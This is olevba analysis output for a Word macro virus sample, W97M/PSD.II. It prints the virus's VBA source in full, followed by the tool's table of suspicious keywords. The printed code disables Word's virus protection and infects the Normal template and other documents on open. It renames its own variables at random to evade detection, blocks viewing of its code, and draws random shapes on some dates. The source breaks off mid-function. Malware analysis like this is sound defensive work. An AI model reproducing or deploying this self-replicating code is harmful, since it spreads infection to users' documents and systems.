olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-b598c062c63f91d957dfa6e496003988ee32e71d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-b598c062c63f91d957dfa6e496003988ee32e71d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For KQ9456 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next KQ9456: End If
GG8423 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
KI905 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set NL3664 = ActiveDocument.VBProject.VBComponents.Item(1)
FP3963 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set NL3664 = NormalTemplate.VBProject.VBComponents.Item(1)
DL9832 = True
Call FJ9091_TO2133
ActiveDocument.Saved = True
End If
If DL9832 <> True And FP3963 <> True Then GoTo OJ9252
If DL9832 = True Then NL3664.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, GG8423 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If FP3963 = True Then NL3664.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KI905 - 4))
OJ9252:
If KI905 <> 0 And GG8423 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function FJ9091_TO2133()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "QA2212": r1(2) = "KB4157": r1(3) = "HG922": r1(4) = "EC2777": r1(5) = "TO2133": r1(6) = "GG8423"
r1(7) = "KI905": r1(8) = "FP3963":: r1(9) = "NL3664": r1(10) = "DL9832": r1(11) = "OJ9252": r1(12) = "FJ9091": r1(13) = "IH4955": r1(14) = "KG2365": r1(15) = "KQ9456"
For KQ9456 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call TO2133(a1, r1(KQ9456))
Next KQ9456
End Function 'VAMP v1.0 [thanks Vic!]
Private Function TO2133(KG2365, IH4955 As String)
On Error Resume Next
Dim QA2212 As Long: Dim KB4157 As Long: Dim HG922 As Long: Dim EC2777 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
QA2212 = 1: KB4157 = 1: HG922 = .CountOfLines: EC2777 = Len(.Lines(.CountOfLines, 1))
Do While .Find(IH4955, QA2212, KB4157, HG922, EC2777, True)
strline = .Lines(QA2212, 1)
strline = Left(strline, KB4157 - 1) & KG2365 & Mid(strline, EC2777)
.replaceline QA2212, strline
QA2212 = HG922 + 1: KB4157 = 1:
HG922 = .CountOfLines
EC2777 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function TG105_VC6092()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "FG1217": r1(2) = "CA4034": r1(3) = "QQ1997": r1(4) = "DC032": r1(5) = "VC6092": r1(6) = "GC631"
r1(7) = "AM164": r1(8) = "AC8697":: r1(9) = "HD2378": r1(10) = "KG4470": r1(11) = "GG1656": r1(12) = "TG105": r1(13) = "PD8424": r1(14) = "DV9232": r1(15) = "EF1665"
For EF1665 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

